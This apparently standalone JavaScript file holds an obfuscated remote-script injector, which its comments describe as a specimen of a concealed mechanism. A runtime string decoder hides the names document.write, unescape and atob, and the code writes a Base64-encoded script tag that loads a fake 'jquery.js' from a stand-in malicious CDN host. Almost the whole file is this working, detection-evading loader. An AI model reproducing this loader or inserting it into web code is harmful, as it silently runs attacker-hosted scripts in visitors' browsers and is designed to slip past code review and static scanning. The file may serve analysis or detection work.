
// Concealed remote-script injection shipped as a standalone script file.
// working mechanism as the reviewed specimen. The Base64 blob decodes to
// <script src="https://malicious-cdn.example.invalid/s4/jquery.js"></script>.
// A string-table decoder resolves each concealed name at runtime
// (document, write, unescape, atob); computed dispatch hides the sink, so no
// literal sink, stage, or URL appears in static text.
var contact="support@example.invalid";
const alpha='LKjVh5ETvW9F7482CAMoItc_aRmeZqs0YJGniSyHBwrgzP6l$fDbNXpOd3QukUx1';
const pa='par', se='seInt';
const decode=(code)=>(code.split(/[A-Z]/).map(part=>alpha.charAt(window[pa+se](part,6+30))).join('Int'.charAt(12)));
const payload='PHNjcmlwdCBzcmM9Imh0dHBzOi8vbWFsaWNpb3VzLWNkbi5leGFtcGxlLmludmFsaWQvczQvanF1ZXJ5LmpzIj48L3NjcmlwdD4=';
(window)[decode('1kBjXmK1nZqCrQzHlR')][decode('15N16B10KlXrN')](decode('1nFzWrBuPmXoX1iHrZ')(decode('oWlCjK1fF')(payload)));

